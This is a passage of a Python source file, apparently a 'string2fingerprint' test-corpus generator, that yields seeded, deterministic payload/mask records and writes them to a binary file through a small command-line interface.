    """Yield `count` deterministic Records (payload, mask, kind, pair id, carrier).

    The second half of a pair is queued and released a few samples later.
    """
    rng = random.Random(seed)
    pending: deque = deque()
    pid = 0
    emitted = 0
    while emitted < count:
        if pending and rng.random() < 0.4:
            yield pending.popleft()
            emitted += 1
            continue
        recs = _draw(rng, pid)
        pid += 1
        if not recs:
            continue
        yield recs[0]
        emitted += 1
        pending.extend(recs[1:])


def generate(seed: int, count: int) -> Iterator[Tuple[bytes, int]]:
    """Yield `count` deterministic (payload_bytes, label_mask) samples."""
    for rec in generate_records(seed, count):
        yield rec.payload, rec.mask


def write_corpus(path: str, samples: Iterable[Tuple[bytes, int]]) -> int:
    """Write records: u32 LE length, u8 mask, payload. Returns record count."""
    n = 0
    header = struct.Struct("<IB")
    with open(path, "wb") as f:
        for payload, mask in samples:
            if not isinstance(payload, (bytes, bytearray)):
                payload = _as_bytes(payload)
            f.write(header.pack(len(payload), mask & 0xFF))
            f.write(payload)
            n += 1
    return n


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main(argv: List[str]) -> int:
    ap = argparse.ArgumentParser(description="string2fingerprint corpus generator")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--count", type=int, default=400000)
    ap.add_argument("--out", type=str, default="corpus.bin")
    args = ap.parse_args(argv)
    n = write_corpus(args.out, generate(args.seed, args.count))
    print("wrote %d records to %s" % (n, args.out))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
